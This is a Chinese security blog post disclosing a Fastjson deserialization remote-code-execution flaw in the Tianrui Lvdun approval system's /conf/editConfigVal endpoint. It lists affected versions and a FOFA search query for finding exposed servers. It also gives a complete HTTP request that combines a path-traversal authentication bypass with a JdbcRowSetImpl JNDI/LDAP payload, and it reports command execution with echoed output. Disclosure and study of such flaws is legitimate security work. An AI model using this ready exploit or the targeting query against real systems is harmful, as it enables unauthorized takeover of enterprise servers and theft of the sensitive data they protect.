---
title: "天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-editConfigVal-fastjson-rce.html
asset_dir: assets/天锐绿盾审批系统-confeditconfigval-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/22 08:26
- 522浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

计算机安全

授权

安全

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞预警服务

该系统的 `/conf/editConfigVal` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

安全运维咨询

防火墙软件

Web安全书籍

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 计算机安全

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞](images/img-001-7fd4709df922.webp)](https://image.mrxn.net/6cf09d012291401090b72dd14c478266.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

漏洞扫描服务

网络安全课程

Windows安全工具

再看`/conf/editConfigVal` 的实现部分

[![天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞](images/img-002-c04cca89f4cd.webp)](https://image.mrxn.net/76fa473a8fc342779678ff7a3241cfef.webp)

请求body被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

安全研究工具

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

[![天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞](images/img-003-14c9c9720b41.webp)](https://image.mrxn.net/b2b455a84f3e4e7ab4cabafc5742bc37.webp)

```
POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显命令执行结果

漏洞预警服务

[![天锐绿盾审批系统 /conf/editConfigVal fastjson反序列化漏洞](images/img-004-de073860535e.webp)](https://image.mrxn.net/da33f23b666245b6969d8d2bbf33c29d.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
